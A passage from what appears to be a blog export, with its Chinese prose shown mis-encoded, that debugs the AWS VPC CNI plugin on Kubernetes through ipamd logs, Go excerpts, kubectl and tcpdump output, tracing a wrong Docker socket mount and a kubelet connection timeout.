æ”¾åˆ°è¿›ç¨‹ç¼“å­˜ä¸­ï¼Œç„¶åè°ƒç”¨ k8s æ¥å£ å’Œ docker æ¥å£é‡å»ºæœ¬åœ° ip åˆ†é…å…³ç³»ã€‚ 12345678910111213141516171819202122232425262728292019-11-26T02:28:11.394Z [DEBUG]\tStart node init2019-11-26T02:28:11.394Z [DEBUG]\tTotal number of interfaces found: 22019-11-26T02:28:11.394Z [DEBUG]\tFound ENI mac address : 02:43:a8:0e:05:2f2019-11-26T02:28:11.395Z [DEBUG]\tUsing device number 0 for primary eni: eni-0debffa6dcf067b1b2019-11-26T02:28:11.395Z [DEBUG]\tFound ENI: eni-0debffa6dcf067b1b, MAC 02:43:a8:0e:05:2f, device 02019-11-26T02:28:11.396Z [DEBUG]\tFound CIDR 10.0.10.0/24 for ENI 02:43:a8:0e:05:2f2019-11-26T02:28:11.397Z [DEBUG]\tFound IP addresses [10.0.10.66 10.0.10.192 10.0.10.130 10.0.10.227 10.0.10.166 10.0.10.72 10.0.10.40 10.0.10.136 10.0.10.113 10.0.10.115 10.0.10.53 10.0.10.22 10.0.10.25 10.0.10.26 10.0.10.95] on ENI 02:43:a8:0e:05:2f2019-11-26T02:28:11.397Z [DEBUG]\tFound ENI mac address : 02:ef:be:01:7c:ad2019-11-26T02:28:11.398Z [DEBUG]\tFound ENI: eni-08bafec9495ebc6df, MAC 02:ef:be:01:7c:ad, device 22019-11-26T02:28:11.398Z [DEBUG]\tFound CIDR 10.0.10.0/24 for ENI 02:ef:be:01:7c:ad2019-11-26T02:28:11.399Z [DEBUG]\tFound IP addresses [10.0.10.43 10.0.10.97 10.0.10.34 10.0.10.35 10.0.10.132 10.0.10.70 10.0.10.231 10.0.10.112 10.0.10.208 10.0.10.177 10.0.10.114 10.0.10.214 10.0.10.87 10.0.10.119 10.0.10.185] on ENI 02:ef:be:01:7c:ad2019-11-26T02:28:11.399Z [INFO]\tSetting up host network...2019-11-26T02:28:11.399Z [DEBUG]\tTrying to find primary interface that has mac : 02:43:a8:0e:05:2f2019-11-26T02:28:11.399Z [DEBUG]\tDiscovered interface: lo, mac:2019-11-26T02:28:11.399Z [DEBUG]\tDiscovered interface: eth0, mac: 02:43:a8:0e:05:2f2019-11-26T02:28:11.399Z [INFO]\tDiscovered primary interface: eth02019-11-26T02:28:11.399Z [DEBUG]\tSetting RPF for primary interface: /proc/sys/net/ipv4/conf/eth0/rp_filter2019-11-26T02:28:11.400Z [DEBUG]\tSetup Host Network: iptables -N AWS-SNAT-CHAIN-0 -t nat2019-11-26T02:28:11.401Z [DEBUG]\tSetup Host Network: iptables -N AWS-SNAT-CHAIN-1 -t nat2019-11-26T02:28:11.402Z [DEBUG]\tSetup Host Network: iptables -A POSTROUTING -m comment --comment &quot;AWS SNAT CHAIN&quot; -j AWS-SNAT-CHAIN-02019-11-26T02:28:11.402Z [DEBUG]\tSetup Host Network: iptables -A AWS-SNAT-CHAIN-0 ! -d 10.0.0.0/16 -t nat -j AWS-SNAT-CHAIN-12019-11-26T02:28:11.402Z [DEBUG]\tiptableRules: [nat/POSTROUTING rule first SNAT rules for non-VPC outbound traffic nat/AWS-SNAT-CHAIN-0 rule [0] AWS-SNAT-CHAIN nat/AWS-SNAT-CHAIN-1 rule last SNAT rule for non-VPC outbound traffic]2019-11-26T02:28:11.402Z [DEBUG]\texecute iptable rule : first SNAT rules for non-VPC outbound traffic2019-11-26T02:28:11.403Z [DEBUG]\texecute iptable rule : [0] AWS-SNAT-CHAIN2019-11-26T02:28:11.403Z [DEBUG]\texecute iptable rule : last SNAT rule for non-VPC outbound traffic2019-11-26T02:28:11.404Z [DEBUG]\texecute iptable rule : connmark for primary ENI2019-11-26T02:28:11.405Z [DEBUG]\texecute iptable rule : connmark restore for primary ENI2019-11-26T02:28:11.406Z [DEBUG]\texecute iptable rule : rule for primary address 10.0.10.662019-11-26T02:28:11.407Z [DEBUG]\tDiscovered ENI eni-0debffa6dcf067b1b, trying to set it up ä¸‹é¢å°±æ˜¯é‡å»ºåœ°å€æ± åˆ†é…çš„ç»†èŠ‚ 1234567891011121314151617181920212223242526272829303132333435363738394041422019-11-26T02:28:11.481Z [INFO]\tSynced successfully with APIServer2019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-telemetry-6dbd664c76-2m4x4 on my node, namespace = istio-system, IP = 10.0.10.1362019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod cni-metrics-helper-7774cb895c-cfhlh on my node, namespace = kube-system, IP = 10.0.10.1132019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-galley-59fd9c6c8-vxmsn on my node, namespace = istio-system, IP = 10.0.10.222019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod kiali-7b5b867f8-hn9pg on my node, namespace = istio-system, IP = 10.0.10.1302019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-citadel-864989dd69-lx72c on my node, namespace = istio-system, IP = 10.0.10.2272019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-egressgateway-6bc7c7874f-dvkpx on my node, namespace = istio-system, IP = 10.0.10.1152019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod kiali-7b5b867f8-gr6bf on my node, namespace = istio-system, IP = 10.0.10.1362019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod grafana-7869478fc5-vh4fs on my node, namespace = istio-system, IP = 10.0.10.402019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-ingressgateway-756fd55f-mlf9w on my node, namespace = istio-system, IP = 10.0.10.592019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-tracing-79db5954f-8bkw7 on my node, namespace = istio-system, IP = 10.0.10.1662019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-policy-7984978f85-s4pzk on my node, namespace = istio-system, IP = 10.0.10.532019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-sidecar-injector-7dc597dfc7-n8s2k on my node, namespace = istio-system, IP = 10.0.10.952019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod metrics-server-c654cf865-rt9rp on my node, namespace = kube-system, IP = 10.0.10.952019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-pilot-5cdcc74bf9-h8ghs on my node, namespace = istio-system, IP = 10.0.10.1652019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod prometheus-5b48f5d49-nvtc8 on my node, namespace = istio-system, IP = 10.0.10.1612019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod kiali-7b5b867f8-bhgh8 on my node, namespace = istio-system, IP = 10.0.10.2272019-11-26T02:28:11.481Z [INFO]\tAdd/Update for CNI pod aws-node-knkw92019-11-26T02:28:11.481Z [INFO]\tAdd/Update for CNI pod aws-node-67hv52019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod kiali-7b5b867f8-4bcl6 on my node, namespace = istio-system, IP = 10.0.10.402019-11-26T02:28:11.564Z [DEBUG]\tDataStore Add an ENI eni-0debffa6dcf067b1b2019-11-26T02:28:11.564Z [DEBUG]\tAdding ENI(eni-0debffa6dcf067b1b)&#x27;s IPv4 address 10.0.10.192 to datastore2019-11-26T02:28:11.564Z [DEBUG]\tIP Address Pool stats: total: 0, assigned: 02019-11-26T02:28:11.564Z [INFO]\tAdded ENI(eni-0debffa6dcf067b1b)&#x27;s IP 10.0.10.192 to datastore2019-11-26T02:28:11.564Z [DEBUG]\tAdding ENI(eni-0debffa6dcf067b1b)&#x27;s IPv4 address 10.0.10.130 to datastore...2019-11-26T02:28:11.565Z [DEBUG]\tAdding ENI(eni-0debffa6dcf067b1b)&#x27;s IPv4 address 10.0.10.95 to datastore2019-11-26T02:28:11.565Z [DEBUG]\tIP Address Pool stats: total: 13, assigned: 02019-11-26T02:28:11.565Z [INFO]\tAdded ENI(eni-0debffa6dcf067b1b)&#x27;s IP 10.0.10.95 to datastore2019-11-26T02:28:11.565Z [INFO]\tENI eni-0debffa6dcf067b1b set up.2019-11-26T02:28:11.565Z [DEBUG]\tDiscovered ENI eni-08bafec9495ebc6df, trying to set it up2019-11-26T02:28:11.666Z [DEBUG]\tDataStore Add an ENI eni-08bafec9495ebc6df2019-11-26T02:28:11.666Z [INFO]\tSetting up network for an ENI with IP address 10.0.10.43, MAC address 02:ef:be:01:7c:ad, CIDR 10.0.10.0/24 and route table 22019-11-26T02:28:11.666Z [DEBUG]\tFound the Link that uses mac address 02:ef:be:01:7c:ad and its index is 77 (attempt 1/5)2019-11-26T02:28:11.666Z [DEBUG]\tSetting up ENI&#x27;s primary IP 10.0.10.432019-11-26T02:28:11.666Z [DEBUG]\tDeleting existing IP address 10.0.10.43/24 eth12019-11-26T02:28:11.667Z [DEBUG]\tAdding IP address 10.0.10.43/242019-11-26T02:28:11.667Z [DEBUG]\tSetting up ENI&#x27;s default gateway 10.0.10.12019-11-26T02:28:11.667Z [DEBUG]\tSuccessfully added route route 10.0.10.1/0 via 10.0.10.1 table 22019-11-26T02:28:11.667Z [DEBUG]\tSuccessfully added route route 0.0.0.0/0 via 10.0.10.1 table 2...2019-11-26T02:28:11.668Z [INFO]\tK8SGetLocalPodIPs discovered local Pods: grafana-7869478fc5-vh4fs istio-system 10.0.10.40 325fa5b9-0f5f-11ea-baca-0262684723a1 ä¸‹é¢çš„æ—¥å¿—å°±æ˜¯æœ¬æ¬¡é—®é¢˜çš„æ ¸å¿ƒäº†ï¼Œæˆ‘è¿˜ä¸€ç›´å¾ˆå¥‡æ€ªä¸ºä»€ä¹ˆæ—¥å¿—æ€»æ˜¯è¯´ IP pool stats: total = 28, used = 0, c.maxIPsPerENI = 14 è¿™æ ·çš„ä¿¡æ¯ï¼Œå› ä¸ºåœ¨æˆ‘çœ‹æ¥è¿™ä¸ªèŠ‚ç‚¹ä¸Šä½¿ç”¨ aws cni pod çš„æ•°é‡æ›´æœ¬ä¸æ˜¯ 0 ä¸ªã€‚ 1234567891011121314151617181920212019-11-26T02:28:11.668Z [INFO]\tNot able to get local containers yet (attempt 1/5): Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?2019-11-26T02:28:11.702Z [INFO]\tAdd/Update for Pod cni-metrics-helper-7774cb895c-cfhlh on my node, namespace = kube-system, IP = 10.0.10.113...2019-11-26T02:28:14.668Z [INFO]\tNot able to get local containers yet (attempt 2/5): Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?2019-11-26T02:28:14.699Z [INFO]\tAdd/Update for CNI pod aws-node-67hv52019-11-26T02:28:15.501Z [INFO]\tAdd/Update for Pod istio-tracing-79db5954f-8bkw7 on my node, namespace = istio-system, IP = 10.0.10.1662019-11-26T02:28:15.899Z [INFO]\tAdd/Update for Pod grafana-7869478fc5-vh4fs on my node, namespace = istio-system, IP = 10.0.10.402019-11-26T02:28:16.298Z [INFO]\tAdd/Update for Pod istio-sidecar-injector-7dc597dfc7-n8s2k on my node, namespace = istio-system, IP = 10.0.10.952019-11-26T02:28:16.698Z [INFO]\tAdd/Update for Pod prometheus-5b48f5d49-nvtc8 on my node, namespace = istio-system, IP = 10.0.10.1612019-11-26T02:28:17.669Z [INFO]\tNot able to get local containers yet (attempt 3/5): Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?2019-11-26T02:28:20.669Z [INFO]\tNot able to get local containers yet (attempt 4/5): Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?2019-11-26T02:28:23.669Z [INFO]\tNot able to get local containers yet (attempt 5/5): Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?2019-11-26T02:28:26.669Z [DEBUG]\tgetLocalPodsWithRetry() found 17 used IPs.2019-11-26T02:28:26.669Z [INFO]\tSkipping Pod istio-ingressgateway-756fd55f-mlf9w, Namespace istio-system, due to no matching container2019-11-26T02:28:26.669Z [INFO]\tSkipping Pod istio-tracing-79db5954f-8bkw7, Namespace istio-system, due to no matching container2019-11-26T02:28:26.669Z [INFO]\tSkipping Pod prometheus-5b48f5d49-nvtc8, Namespace istio-system, due to no matching container2019-11-26T02:28:26.669Z [INFO]\tSkipping Pod istio-telemetry-6dbd664c76-2m4x4, Namespace istio-system, due to no matching container2019-11-26T02:28:26.669Z [INFO]\tSkipping Pod kiali-7b5b867f8-hn9pg, Namespace istio-system, due to no matching container...// è¿™ä¸€æ®µéƒ½æ˜¯ INFO çº§åˆ« skip ä¿¡æ¯.2019-11-26T02:28:26.669Z [INFO]\tSkipping Pod grafana-7869478fc5-vh4fs, Namespace istio-system, due to no matching container 123456789101112131415161718192021222324func (c *IPAMContext) getLocalPodsWithRetry() ([]*k8sapi.K8SPodInfo, error) &#123;\tvar pods []*k8sapi.K8SPodInfo\tvar err error\tfor retry := 1; retry &lt;= maxK8SRetries; retry++ &#123; pods, err = c.k8sClient.K8SGetLocalPodIPs()...\tvar containers map[string]*docker.ContainerInfo\tfor retry := 1; retry &lt;= maxK8SRetries; retry++ &#123; containers, err = c.dockerClient.GetRunningContainers() // æ—¥å¿—å°±æ˜¯åœ¨è¿™ä¸ªå‡½æ•°é‡Œé¢æ‰“å‡ºæ¥çš„ï¼Œè¿™ä¸ªæ—¶å€™ container id å°±æ˜¯ç©ºçš„\t// TODO consider using map\tfor _, pod := range pods &#123; // needs to find the container ID for _, container := range containers &#123; // è¿™é‡Œå‘ç°æ˜¯ç©ºçš„ if container.K8SUID == pod.UID &#123; log.Debugf(&quot;Found pod(%v)&#x27;s container ID: %v &quot;, container.Name, container.ID) pod.Container = container.ID break &#125; &#125;\t&#125;\treturn pods, nil\t// è¿™é‡Œè¿”å› ipamd è®°å½•çš„ pod ä¿¡æ¯é‡Œé¢å°±æ²¡æœ‰ container id&#125; è¿”å› getLocalPodsWithRetry çš„è°ƒç”¨æ–¹ nodeinit å‡½æ•°ï¼Œçœ‹ä¸€ä¸‹ç›¸å…³é€»è¾‘ï¼Œå½“ container id ä¸å­˜åœ¨æ•´ä¸ªipé‡æ–°åˆ†é…çš„é€»è¾‘å°±æ²¡æœ‰èµ°â€¦ æ²¡æœ‰èµ°â€¦ æ²¡æœ‰èµ°â€¦ 123456789101112131415//TODO need to break this function down(comments from CR)func (c *IPAMContext) nodeInit() error &#123;...\tusedIPs, err := c.getLocalPodsWithRetry()\tlog.Debugf(&quot;getLocalPodsWithRetry() found %d used IPs.&quot;, len(usedIPs))...\tfor _, ip := range usedIPs &#123; if ip.Container == &quot;&quot; &#123; log.Infof(&quot;Skipping Pod %s, Namespace %s, due to no matching container&quot;, ip.Name, ip.Namespace) continue &#125;...\t&#125;\treturn nil&#125; å› ä¸º ipamd å‘ç°æˆ‘ä»¬æœ‰å¤§é‡ ip ç”³è¯·äº†ï¼Œä½†æ˜¯æ²¡æœ‰ç”¨ ipamd å¤„äºèŠ‚çº¦è€ƒè™‘å¸®æˆ‘ä»¬é‡Šæ”¾äº†ï¼Œä¸‹é¢å°±æ˜¯é‡Šæ”¾çš„æ—¥å¿—äº†ã€‚ 12345678910111213141516172019-11-26T02:47:06.317Z [DEBUG]\tnodeIPPoolReconcile: skipping because time since last 51.08553629s &lt;= 1m0s2019-11-26T02:47:08.818Z [DEBUG]\tIP pool stats: total = 28, used = 0, c.maxIPsPerENI = 142019-11-26T02:47:08.818Z [DEBUG]\tIP pool is NOT too low: available (28) &gt;= ENI target (1) * addrsPerENI (14)2019-11-26T02:47:08.818Z [DEBUG]\tIP pool stats: total = 28, used = 0, c.maxIPsPerENI = 142019-11-26T02:47:08.818Z [DEBUG]\tIt might be possible to remove extra ENIs because available (28) &gt; ENI target (1) * addrsPerENI (14):2019-11-26T02:47:08.818Z [DEBUG]\tENI eni-0debffa6dcf067b1b cannot be deleted because it is primary2019-11-26T02:47:08.818Z [DEBUG]\tgetDeletableENI: found a deletable ENI eni-08bafec9495ebc6df2019-11-26T02:47:08.818Z [INFO]\tRemoveUnusedENIFromStore eni-08bafec9495ebc6df: IP address pool stats: free 14 addresses, total: 14, assigned: 02019-11-26T02:47:08.818Z [DEBUG]\tStart freeing ENI eni-08bafec9495ebc6df2019-11-26T02:47:08.818Z [INFO]\tTrying to free ENI: eni-08bafec9495ebc6df2019-11-26T02:47:08.930Z [DEBUG]\tFound ENI eni-08bafec9495ebc6df attachment id: eni-attach-0dc80c1727c8163a82019-11-26T02:47:09.398Z [INFO]\tSuccessfully detached ENI: eni-08bafec9495ebc6df2019-11-26T02:47:09.398Z [DEBUG]\tTrying to delete ENI: eni-08bafec9495ebc6df2019-11-26T02:47:09.550Z [DEBUG]\tNot able to delete ENI yet (attempt 1/20): InvalidParameterValue: Network interface &#x27;eni-08bafec9495ebc6df&#x27; is currently in use.\tstatus code: 400, request id: de8ef372-0567-4b35-8c6d-3f70110899212019-11-26T02:47:14.868Z [INFO]\tSuccessfully deleted ENI: eni-08bafec9495ebc6df2019-11-26T02:47:14.868Z [INFO]\tSuccessfully freed ENI: eni-08bafec9495ebc6df å°è¯•ä¿®å¤è¿™ä¸ªé—®é¢˜ä¿®å¤æ–¹æ¡ˆ 1, è®© ipamd å¯ä»¥æ­£ç¡®çš„ä¸ docker é€šä¿¡ã€‚ 1root 15066 2.9 1.4 1241172 115768 ? Ssl 09:02 0:12 /usr/bin/dockerd -H unix:///var/run/docker.sock --containerd=/run/containerd/containerd.sock 123456789101112131415161718192021222324252627282930313233guohao@pc ~ $ kubectl --kubeconfig ~/Downloads/kubeconfig -n kube-system describe ds aws-nodeName: aws-nodeSelector: k8s-app=aws-nodeNode-Selector: &lt;none&gt;Labels: k8s-app=aws-nodeAnnotations: deprecated.daemonset.template.generation: 12 kubectl.kubernetes.io/last-applied-configuration: &#123;&quot;apiVersion&quot;:&quot;apps/v1&quot;,&quot;kind&quot;:&quot;DaemonSet&quot;,&quot;metadata&quot;:&#123;&quot;annotations&quot;:&#123;&#125;,&quot;labels&quot;:&#123;&quot;k8s-app&quot;:&quot;aws-node&quot;&#125;,&quot;name&quot;:&quot;aws-node&quot;,&quot;namespace&quot;:&quot;kub...Desired Number of Nodes Scheduled: 2Current Number of Nodes Scheduled: 2Number of Nodes Scheduled with Up-to-date Pods: 1Number of Nodes Scheduled with Available Pods: 2Number of Nodes Misscheduled: 0Pods Status: 2 Running / 0 Waiting / 0 Succeeded / 0 FailedPod Template: Labels: k8s-app=aws-node Service Account: aws-node Containers: aws-node: Image: 602401143452.dkr.ecr.us-west-2.amazonaws.com/amazon-k8s-cni:v1.5.3 Port: 61678/TCP Host Port: 61678/TCP Requests: cpu: 10m Environment: AWS_VPC_K8S_CNI_LOGLEVEL: trace AWS_VPC_K8S_CNI_EXTERNALSNAT: true MY_NODE_NAME: (v1:spec.nodeName) Mounts: /host/etc/cni/net.d from cni-net-dir (rw) /host/opt/cni/bin from cni-bin-dir (rw) /host/var/log from log-dir (rw) /run/containerd/containerd.sock from dockersock (rw) /run/containerd/containerd.sock from dockersock (rw) å°±æ˜¯è¿™é‡Œï¼Œæœ¬æ˜¯é€‚é…ç¤¾åŒºçš„ containerd åšäº†ä¿®æ”¹ï¼Œè€Œæˆ‘ä»¬è‡ªå·±çš„ç¯å¢ƒæ˜¯ç”¨çš„ docker. åœ¨é‡æ–°çœ‹ä¸€ä¸‹æ—¥å¿—å·²ç»æ²¡æœ‰é‚£ä¸ªé—®é¢˜äº†ã€‚","tags":["k8s"]},{"title":"amzon aws cni è¸©å‘","path":"/2019/11/20/amazon-vpc-cni/","content":"æœ€è¿‘è¦æŠŠ aws vpc cni é€‚é…åˆ° cluster api å·²ç»é€‚é…å®Œæˆäº†ï¼Œå‘ç°èŠ‚ç‚¹é‡å¯è¿‡å aws-node åœ¨é‡å¯çš„èŠ‚ç‚¹ä¸Šä¸èƒ½æ­£å¸¸ running å¯¼è‡´èŠ‚ç‚¹ä¸Šçš„ pod ä¸èƒ½æ­£å¸¸è¿è¡Œã€‚ è€Œä¸”ä½¿ç”¨è¿‡åœ¨ master ä¸Šä½¿ç”¨ kubectl logs è·å– pod è¿è¡Œä¿¡æ¯å¤±è´¥ã€‚ 12root@ip-10-0-10-69:/home/admin# kubectl -n kube-system logs aws-node-lm9nxError from server: Get https://10.0.10.207:10250/containerLogs/kube-system/aws-node-lm9nx/aws-node: dial tcp 10.0.10.207:10250: i/o timeout ä¹Ÿå°±æ˜¯è¯´ apiserver é“¾æ¥ä¸ä¸Š 10.0.10.207 çš„ kubelet. 123admin@ip-10-0-10-69:~$ telnet 10.0.10.207 10250Trying 10.0.10.207...^C ä½¿ç”¨ telnet ç¡®è®¤ä¸€ä¸‹ ç™»é™†åˆ° 10.0.10.207 node å‘ç°èŠ‚ç‚¹æ˜¯æ”¶åˆ° master å‘èµ·åˆ° 10250 çš„è¯·æ±‚çš„ï¼Œä½†æ˜¯è‡³å°‘åœ¨ç½‘ç»œå±‚æ²¡æœ‰å‘ç°åº”ç­”ã€‚ 123456789root@ip-10-0-10-207:/home/admin# tcpdump -i eth0 port 10250 tcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes02:37:59.749261 IP ip-10-0-10-137.ec2.internal.48148 &gt; ip-10-0-10-207.ec2.internal.10250: Flags [S], seq 3114509118, win 26883, options [mss 8961,sackOK,TS val 145034504 ecr 0,nop,wscale 7], length 002:38:00.166263 IP ip-10-0-10-69.ec2.internal.36450 &gt; ip-10-0-10-207.ec2.internal.10250: Flags [S], seq 3957291899, win 26883, options [mss 8961,sackOK,TS val 145204104 ecr 0,nop,wscale 7], length 002:38:00.934330 IP ip-10-0-10-69.ec2.internal.36458 &gt; ip-10-0-10-207.ec2.internal.10250: Flags [S], seq 3138969954, win 26883, options [mss 8961,sackOK,TS val 145204296 ecr 0,nop,wscale 7], length 002:38:01.765288 IP ip-10-0-10-137.ec2.internal.48148 &gt; ip-10-0-10-207.ec2.internal.10250: Flags [S], seq 3114509118, win 26883, options [mss 8961,sackOK,TS val 145035008 ecr 0,nop,wscale 7], length 002:38:04.234328 IP ip-10-0-10-69.ec2.internal.36450 &gt; ip-10-0-10-207.ec2.internal.10250: Flags [S], seq 3957291899, win 26883, options [mss 8961,sackOK,TS val 145205120 ecr 0,nop,wscale 7], length 002:38:04.998242 IP ip-10-0-10-69.ec2.internal.36458 &gt; ip-10-0-10-207.ec2.internal.10250: Flags [S], seq 3138969954, win 26883, options [mss 8961,sackOK,TS val 145205312 ecr 0,nop,wscale 7], length 002:38:05.861341 IP ip-10-0-10-137.ec2.internal.48148 &gt; ip-10-0-10-207.ec2.internal.10250: Flags [S], seq 3114509118, win 26883, options [mss 8961,sackOK,TS val 145036032 ecr 0,nop,wscale 7], length 0 å‘ç°é—®é¢˜ä¸èƒ½ä¸€ä¸‹å­æ’¸æ¸…æ¥šï¼Œåªèƒ½æ…¢æ…¢æ¢ç´¢é“¾è·¯ã€‚ ip-10-0-10-69 æ˜¯ master èŠ‚ç‚¹ 12kubectl -n kube-system logs aws-node-lm9nxError from server: Get https://10.0.10.207:10250/containerLogs/kube-system/aws-node-lm9nx/aws-node: dial tcp 10.0.10.207:10250: i/o timeout å‘ç°åªæœ‰å‡ºçš„æ•°æ®åŒ…ï¼Œå¹¶æ²¡æœ‰å›æ¥çš„æ•°æ®åŒ…ã€‚ 12345678910111213root@ip-10-0-10-69:/home/admin# tcpdump -i any host 10.0.10.207 and port 10250 -ntcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes06:59:45.926815 IP 10.0.10.69.60944 &gt; 10.0.10.207.10250: Flags [S], seq 65945781, win 26883, options [mss 8961,sackOK,TS val 149130544 ecr 0,nop,wscale 7], length 006:59:49.318816 IP 10.0.10.69.60934 &gt; 10.0.10.207.10250: Flags [S], seq 1568373055, win 26883, options [mss 8961,sackOK,TS val 149131392 ecr 0,nop,wscale 7], length 006:59:50.086848 IP 10.0.10.69.60944 &gt; 10.0.10.207.10250: Flags [S], seq 65945781, win 26883, options [mss 8961,sackOK,TS val 149131584 ecr 0,nop,wscale 7], length 006:59:54.164908 IP 10.0.10.69.32788 &gt; 10.0.10.207.10250: Flags [S], seq 1174539368, win 26883, options [mss 8961,sackOK,TS val 149132603 ecr 0,nop,wscale 7], length 006:59:55.174808 IP 10.0.10.69.32788 &gt; 10.0.10.207.10250: Flags [S], seq 1174539368, win 26883, options [mss 8961,sackOK,TS val 149132856 ecr 0,nop,wscale 7], length 006:59:57.124514 IP 10.0.10.69.32814 &gt; 10.0.10.207.10250: Flags [S], seq 1241021276, win 26883, options [mss 8961,sackOK,TS val 149133343 ecr 0,nop,wscale 7], length 006:59:57.190814 IP 10.0.10.69.32788 &gt; 10.0.10.207.10250: Flags [S], seq 1174539368, win 26883, options [mss 8961,sackOK,TS val 149133360 ecr 0,nop,wscale 7], length 006:59:57.891175 IP 10.0.10.69.32822 &gt; 10.0.10.207.10250: Flags [S], seq 1819028184, win 26883, options [mss 8961,sackOK,TS val 149133535 ecr 0,nop,wscale 7], length 006:59:58.150818 IP 10.0.10.69.32814 &gt; 10.0.10.207.10250: Flags [S], seq 1241021276, win 26883, options [mss 8961,sackOK,TS val 149133600 ecr 0,nop,wscale 7], length 006:59:58.918835 IP 10.0.10.69.32822 &gt; 10.0.10.207.10250: Flags [S], seq 1819028184, win 26883, options [mss 8961,sackOK,TS val 149133792 ecr 0,nop,wscale 7], length 0 åœ¨ ip-10-0-10-207 èŠ‚ç‚¹è§‚å¯Ÿï¼Œç™»é™†åˆ¤æ–­æ•°æ®æµå‘ 1234567root@ip-10-0-10-207:/home/admin# ip addr show eth02: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 9001 qdisc mq state UP group default qlen 1000 link/ether 02:00:ba:2b:02:3f brd ff:ff:ff:ff:ff:ff inet 10.0.10.207/24 brd 10.0.10.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::baff:fe2b:23f/64 scope link valid_lft forever preferred_lft forever 1234567root@ip-10-0-10-207:/home/admin# ip addr show eth13: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 9001 qdisc mq state UP group default qlen 1000 link/ether 02:e1:30:86:0d:35 brd ff:ff:ff:ff:ff:ff inet 10.0.10.190/24 brd 10.0.10.255 scope global eth1 valid_lft forever preferred_lft forever inet6 fe80::e1:30ff:fe86:d35/64 scope link valid_lft forever preferred_lft forever 1234567891011root@ip-10-0-10-207:/home/admin# tcpdump -n -i eth0 host 10.0.10.69 and port 10250tcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes07:03:15.143334 IP 10.0.10.69.34162 &gt; 10.0.10.207.10250: Flags [S], seq 1951564140, win 26883, options [mss 8961,sackOK,TS val 149182848 ecr 0,nop,wscale 7], length 007:03:15.911228 IP 10.0.10.69.34172 &gt; 10.0.10.207.10250: Flags [S], seq 1628830348, win 26883, options [mss 8961,sackOK,TS val 149183040 ecr 0,nop,wscale 7], length 007:03:18.472285 IP 10.0.10.69.34218 &gt; 10.0.10.207.10250: Flags [S], seq 1626614180, win 26883, options [mss 8961,sackOK,TS val 149183680 ecr 0,nop,wscale 7], length 007:03:19.239186 IP 10.0.10.69.34162 &gt; 10.0.10.207.10250: Flags [S], seq 1951564140, win 26883, options [mss 8961,sackOK,TS val 149183872 ecr 0,nop,wscale 7], length 007:03:19.499242 IP 10.0.10.69.34218 &gt; 10.0.10.207.10250: Flags [S], seq 1626614180, win 26883, options [mss 8961,sackOK,TS val 149183937 ecr 0,nop,wscale 7], length 007:03:20.007198 IP 10.0.10.69.34172 &gt; 10.0.10.207.10250: Flags [S], seq 1628830348, win 26883, options [mss 8961,sackOK,TS val 149184064 ecr 0,nop,wscale 7], length 007:03:21.511227 IP 10.0.10.69.34218 &gt; 10.0.10.207.10250: Flags [S], seq 1626614180, win 26883, options [mss 8961,sackOK,TS val 149184440 ecr 0,nop,wscale 7], length 007:03:25.639190 IP 10.0.10.69.34218 &gt; 10.0.10.207.10250: Flags [S], seq 1626614180, win 26883, options [mss 8961,sackOK,TS val 149185472 ecr 0,nop,wscale 7], length 0 12345678910111213root@ip-10-0-10-207:/home/admin# tcpdump -n -i eth1 host 10.0.10.69 and port 10250tcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes07:04:56.488272 IP 10.0.10.207.10250 &gt; 10.0.10.69.34908: Flags [S.], seq 2079765709, ack 3299090550, win 26847, options [mss 8961,sackOK,TS val 492099 ecr 149208184,nop,wscale 7], length 007:04:57.124636 IP 10.0.10.207.10250 &gt; 10.0.10.69.34924: Flags [S.], seq 899903279, ack 2422028185, win 26847, options [mss 8961,sackOK,TS val 492258 ecr 149208343,nop,wscale 7], length 007:04:57.499734 IP 10.0.10.207.10250 &gt; 10.0.10.69.34812: Flags [S.], seq 3175686817, ack 1025375908, win 26847, options [mss 8961,sackOK,TS val 492352 ecr 149204593,nop,wscale 7], length 007:04:57.499757 IP 10.0.10.207.10250 &gt; 10.0.10.69.34908: Flags [S.], seq 2079765709, ack 3299090550, win 26847, options [mss 8961,sackOK,TS val 492352 ecr 149208184,nop,wscale 7], length 007:04:57.511095 IP 10.0.10.207.10250 &gt; 10.0.10.69.34908: Flags [S.], seq 2079765709, ack 3299090550, win 26847, options [mss 8961,sackOK,TS val 492354 ecr 149208184,nop,wscale 7], length 007:04:57.892015 IP 10.0.10.207.10250 &gt; 10.0.10.69.34932: Flags [S.], seq 449930065, ack 724857165, win 26847, options [mss 8961,sackOK,TS val 492450 ecr 149208535,nop,wscale 7], length 007:04:58.139725 IP 10.0.10.207.10250 &gt; 10.0.10.69.34924: Flags [S.], 